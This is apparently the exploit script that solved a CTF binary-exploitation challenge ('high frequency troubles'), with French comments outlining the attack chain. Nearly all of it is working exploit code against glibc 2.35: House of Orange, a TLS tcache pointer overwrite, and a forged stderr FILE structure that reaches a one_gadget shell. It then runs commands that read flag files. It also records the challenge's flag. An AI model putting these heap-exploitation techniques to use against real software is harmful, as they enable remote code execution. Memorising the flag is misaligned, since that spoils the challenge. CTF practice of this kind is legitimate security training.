#!/usr/bin/env python3
# 441 - high frequency troubles  (Binary Exploitation, picoCTF 2024)
# Flag: academy{mm4p_mm4573r_bd53dae0}
# Write-up: ../../../writeups/binary-exploitation/441-high-frequency-troubles.md
# Script exact utilise pour produire le flag.
#
# CyLab Academy #441 "high frequency troubles" (glibc 2.35-0ubuntu3.3) exploit
#
# Chaîne d'attaque :
#   1. House of Orange : on rétrécit le top chunk, un malloc surdimensionné fait donc
#      libérer l'ancien top dans l'unsorted bin (le binaire n'a aucun free())
#   2. on reprend 0x20 octets de ce chunk et on ECHO : le prev_size du remainder donne
#      une fuite de tas (heap + 0x2d0)
#   3. on écrit un faux tcache_perthread_struct dans le chunk de 0x1000 fraîchement alloué
#   4. malloc(0x30001) : la zone mmap se pose juste sous le bloc TLS statique, on la
#      déborde pour écraser le pointeur tcache du TLS (fs_base - 0x48)
#   5. un malloc qui vient du faux tcache rend une allocation arbitraire alignée,
#      on y lit le fd de l'unsorted/large bin (fuite libc)
#   6. on construit un faux wide_data et une fausse w-vtable dans le trou de tas orphelin
#   7. on écrase _IO_2_1_stderr_ par un faux FILE (vtable = _IO_wfile_jumps)
#   8. on corrompt la taille du top : __malloc_assert, flush de stderr, puis
#      _IO_wfile_xsputn -> _IO_wfile_overflow -> _IO_wdoallocbuf -> __doallocate
#      soit un one_gadget execve("/bin/sh")
import os, sys
from pwn import *
context.log_level = os.environ.get('LOG', 'info')
context.arch = 'amd64'

HERE = os.path.dirname(os.path.abspath(__file__))
libc = ELF(os.path.join(HERE, '441_libc.so.6'), checksec=False)

OFF_SYSTEM      = libc.sym['system']
OFF_WFILE_JUMPS = libc.sym['_IO_wfile_jumps']
OFF_STDERR      = libc.sym['_IO_2_1_stderr_']
OFF_UNSORTED    = 0x21a2e0           # R->fd while R is in the unsorted bin

ONE_GADGETS = [0xebcf5, 0xebcf1, 0xebcf8, 0xebd52]

HEAP_LEAK_OFF   = 0x2d0
CHUNK_V         = 0x2d0
CHUNK_R         = 0x2f0
R_SIZE          = 0xcf0
FAKE_TCACHE_OFF = 0x22020
HOLE            = 0x10000
TOP_OFF         = 0x23020
DELTA_TLS       = 0x316e0

REMOTE_HOST = os.environ.get('HOST', 'chatelaine.cylabacademy.net')
REMOTE_PORT = int(os.environ.get('PORT', '32310'))
ECHO6 = b"\x01" + b"\x00"*5   # 6 bytes: NUL lands before &data[1] => leak survives
LINE = b"\x1b[1;34mPKT_INFO"

def start():
    if args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT)
    return process(os.path.join(HERE, 'hft'))

io = start()

def maps(pattern):
    try:
        for line in open('/proc/%d/maps' % io.pid):
            if pattern in line:
                return int(line.split('-')[0], 16)
    except Exception:
        pass
    return None

def alloc(size, data=b''):
    io.recvuntil(b"PKT_RES")
    io.send(p64(size))
    d = bytes(data) + b"\n"
    for i in range(0, len(d), 0x4000):   # big single sends get truncated by pwnlib
        io.send(d[i:i+0x4000])

def echo():
    io.recvuntil(b"PKT_DATA\x1b[m:[")
    buf = io.recvuntil(LINE, drop=True)
    assert buf.endswith(b"]\n"), repr(buf[-8:])
    return buf[:-2]

# ---------------------------------------------------------- 1. House of Orange
alloc(0x10, b"\x00"*8)
alloc(0x10, p64(0) + p64(0) + p64(R_SIZE + 0x40 + 1))   # top size := 0xd31
alloc(0x1000, b"\x00"*8)                                # sysmalloc frees old top
alloc(0x8, ECHO6)                                       # 0x20 from freed top + echo
leak = u64(echo()[:6].ljust(8, b"\x00"))
heap = leak - HEAP_LEAK_OFF
log.info("heap leak = %#x -> heap = %#x" % (leak, heap))
rh = maps('[heap]')
if rh:
    log.info("real heap = %#x (delta %#x)" % (rh, heap - rh))
    if os.environ.get('REAL'):
        heap = rh

# ------------------------------------------------------- 2. fake tcache struct
fake_tcache = heap + FAKE_TCACHE_OFF
st = bytearray(0x290)
def sc(i, v): st[2*i] = v & 0xff; st[2*i+1] = (v >> 8) & 0xff
def se(i, v): st[0x80+8*i:0x88+8*i] = p64(v)
sc(0, 1);  se(0, heap + CHUNK_R)         # tcache entries hold user ptrs -> pkt = CHUNK_R
sc(63, 1); se(63, fake_tcache)           # -> pkt = fake_tcache (rewrite)
alloc(0x1000, bytes(st[8:0x290]))

# ------------------------------------ 3. mmap overflow -> TLS tcache pointer
alloc(0x30001, b"A"*DELTA_TLS + p64(fake_tcache))

# --------------------------------------------------------------- 4. libc leak
alloc(0x10, ECHO6)
_raw = echo()
libcleak = u64(_raw[:6].ljust(8, b"\x00"))
log.info("libc leak raw = %s -> %#x" % (_raw.hex(), libcleak))
_rl0 = maps('441_libc.so.6')
if _rl0:
    log.info("TRUE offset of leak = %#x   (base %#x)" % (libcleak - _rl0, _rl0))
if not (0x100000000000 <= libcleak < 0x800000000000):
    log.failure("libc leak looks wrong"); io.close(); sys.exit(1)
libc.address = libcleak - OFF_UNSORTED
log.info("libc leak = %#x -> base = %#x" % (libcleak, libc.address))
rl = maps('441_libc.so.6')
if rl:
    log.info("real libc = %#x (delta %#x)" % (rl, libc.address - rl))
    if os.environ.get('REAL'):
        libc.address = rl

def rewrite_tcache(entries, counts=None):
    s = bytearray(0x290)
    if counts:
        for i, v in counts.items():
            s[2*i] = v & 0xff; s[2*i+1] = (v >> 8) & 0xff
    for i, v in entries.items():
        s[0x80+8*i:0x88+8*i] = p64(v)
    s[2*63] = 1; s[2*63+1] = 0
    s[0x80+8*63:0x88+8*63] = p64(fake_tcache)
    alloc(0x400, bytes(s[8:0x290]))

def arb_write(pkt, size, data):
    """tcache entries are user pointers: the next malloc of that size returns pkt"""
    rewrite_tcache({0: pkt}, {0: 1})
    alloc(size, data)

# repair the size of the chunk still sitting in the large bin
arb_write(heap + CHUNK_R, 0x18, p64(R_SIZE + 1))

# ------------------------------------------- 5. fake wide_data + w-vtable
use_setcontext = bool(os.environ.get('SETCTX'))
fake_wide = heap + HOLE
fake_wvt  = heap + HOLE + 0x100
OG = int(os.environ.get('OG', '0'), 16) if os.environ.get('OG') else ONE_GADGETS[0]
wd = bytearray(0x228)
wd[0x00:0x08] = p64(0)                        # mode qword (== write_ptr)
wd[0xd8:0xe0] = p64(fake_wvt)                 # _wide_vtable  (payload[0xd8] -> +0xe0)
wd[0x160:0x168] = p64(libc.address + OG)      # wvt+0x68 = __doallocate
if use_setcontext:
    wd[0xa0-8:0xa8-8] = p64(fake_wide + 0x200)   # rsp
    wd[0xa8-8:0xb0-8] = p64(libc.address + OFF_SYSTEM)  # rip
    wd[0x68-8:0x70-8] = p64(fake_wide + 0x210)   # rdi -> "/bin/sh"
    wd[0x88-8:0x90-8] = p64(0)
    wd[0x1c0-8:0x1c8-8] = p64(0x1f80)            # ldmxcsr
    wd[0x210-8:0x218-8] = b"/bin/sh\x00"
arb_write(heap + HOLE, 0, bytes(wd))

# ------------------------------------------------------ 6. fake FILE on stderr
stderr = libc.address + OFF_STDERR
buf = bytearray(0xe0 - 8)
def put(off, val): buf[off-8:off-8+8] = p64(val)
put(0x88, heap + HOLE + 0x800)                  # _lock -> zero word
put(0x98, heap + HOLE + 0x810)                  # _codecvt -> zeros
put(0xa0, fake_wide)                            # _wide_data
put(0xc0, 0)                                    # _mode
put(0xd8, libc.address + OFF_WFILE_JUMPS)       # vtable
arb_write(stderr, 0x10, bytes(buf))      # _flags := 0x10 (clean bits)

# ------------------------------------------------------- 7. fire the assert
arb_write(heap + TOP_OFF, 1, p64(R_SIZE + 0x40 + 1))
alloc(0x1000, b"")                              # __malloc_assert -> one_gadget shell
time.sleep(0.5)
io.sendline(b"echo PWNED; id")
io.sendline(b"cat flag.txt; cat /flag.txt; cat /home/*/flag.txt")
io.sendline(b"ls -la; echo END")
out = io.recvrepeat(4)
sys.stdout.write(out.decode('latin-1'))
import re
m = re.findall(r'[A-Za-z0-9_]*\{[^}\n]{4,}\}', out.decode('latin-1'))
if m:
    log.success("FLAG CANDIDATES: %s" % m)
io.close()
